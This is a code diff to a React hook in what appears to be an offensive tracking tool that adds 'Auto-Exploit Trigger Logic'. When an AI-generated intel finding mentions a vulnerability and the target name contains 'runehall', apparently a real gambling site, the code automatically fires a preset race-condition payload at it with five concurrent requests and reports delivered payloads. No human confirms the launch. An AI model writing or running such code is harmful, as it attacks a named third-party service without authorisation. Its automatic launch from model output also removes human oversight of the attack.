@@ -1,5 +1,7 @@
 import { useState, useEffect } from 'react';
 import { generateIntel, models } from './gemini';
+import { executePayload, PRESET_PAYLOADS } from './payloads';
+import { toast } from 'sonner';
 
 export interface TrackedTarget {
   id: string;
@@ -89,6 +91,28 @@ export function useTracking() {
             }
 
             if (finding !== "NONE") {
+              // Auto-Exploit Trigger Logic
+              if (finding.toLowerCase().includes("vulnerability") || finding.toLowerCase().includes("exploit")) {
+                const raceConditionPreset = PRESET_PAYLOADS.find(p => p.name.includes("Race Condition"));
+                if (raceConditionPreset && target.name.toLowerCase().includes("runehall")) {
+                  toast.warning(`[AUTO-EXPLOIT TRIGGERED] Vulnerability detected for ${target.name}. Launching race condition payload...`, {
+                    duration: 6000,
+                  });
+                  executePayload({
+                    url: raceConditionPreset.url,
+                    method: raceConditionPreset.method,
+                    headers: {},
+                    body: raceConditionPreset.body,
+                    concurrency: 5 // Conservative auto-trigger
+                  }).then(results => {
+                    const success = results.filter(r => typeof r.status === 'number' && r.status < 400).length;
+                    if (success > 0) {
+                      toast.success(`[AUTO-EXPLOIT SUCCESS] Delivered ${success} payloads to ${target.name}.`);
+                    }
+                  });
+                }
+              }
+
               const newAlert: Alert = {
                 id: Math.random().toString(36).substr(2, 9),
                 targetName: target.name,
